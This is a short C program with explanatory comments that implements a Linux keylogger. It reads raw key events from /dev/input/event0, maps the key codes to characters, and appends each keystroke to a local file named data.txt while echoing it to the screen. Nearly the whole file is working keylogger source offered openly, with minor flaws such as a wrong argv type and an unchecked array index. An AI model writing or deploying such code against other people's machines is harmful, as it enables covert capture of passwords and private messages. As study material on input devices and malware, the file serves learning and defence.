

// cat /proc/bus/input/devices | more
// We look at the devices/drivers used in linux,
// and notice that Keyboard inputs is saved in event0


// ls -l /dev/input/
// Helps visualize how linux saves keystrokes as an event0



#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE "data.txt"

int main(int argc, char *argv){
  struct input_event ev; //this is form the input.h library
                        // >cat /usr/include/linux/input.h
                        // anything from tht keyboard event,
                        //can be read from the driver
  int evt = open("/dev/input/event0", O_RDONLY);
  FILE *file = fopen(LOGFILE, "a"); // create the file if file doesn't exist
  char *mapofkeys[] = { "_RESERVED_", "_ESC_", "1", "2", "3", "4", "5", "6", "7", "8",
                        "9", "0", "-", "=", "_BACKSPACE_", "\t", "q", "w", "e", "r",
                        "t", "y", "u", "i", "o", "p", "[", "]", "\n", "_LEFTCTRL_",
                        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
                        "'", "`", "_LEFTSHIFT_", "\\", "z", "x", "c", "v", "b",
                        "n", "m", ",", ".", "/", "_RIGHTSHIFT_", "", "_LEFTALT_", " ", "_CAPS_",
                        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
                        "_NUMLOCK_", "_SCROLLLOCK_", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS",
                        "KP1", "KP2", "KP3", "KP0", "KPDOT", "", "ZENKAKUHANKAKU", "102ND", "F11", "F12",
                        "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "_RIGHTCTRL_",
                        "KPSLASH", "SYSRQ", "_RIGHTALT_", "_LINEFEED_", "_HOME_", "_UP_", "_PAGEUP_", "_LEFT_", "_RIGHT_", "_END_",
                        "_DOWN_", "_PAGEDOWN_", "_INSERT_", "_DELETE_", "_MACRO_" , "_MUTE_", "_VOLUMEDOWN_", "_VOLUMEUP_", "_POWER_", "KPEQUAL",
                        "KPPLUSMINUS", "_PAUSE_", "_SCALE_"};

  while(1){
    read(evt, &ev, sizeof(ev));
    fflush(stdout); fflush(file);//creates a buffer/stream for outputs
    if ( (ev.type == EV_KEY) && (ev.value == 1) ) { //ev.value == 0/1  bc it takes a keyboard press and release
      // cat /usr/include/linux/input-event-codes.h
      printf("%s", mapofkeys[ev.code]);
      fprintf(file, "%s", mapofkeys[ev.code]);
    }

  }
  close(evt); fclose(file);
}
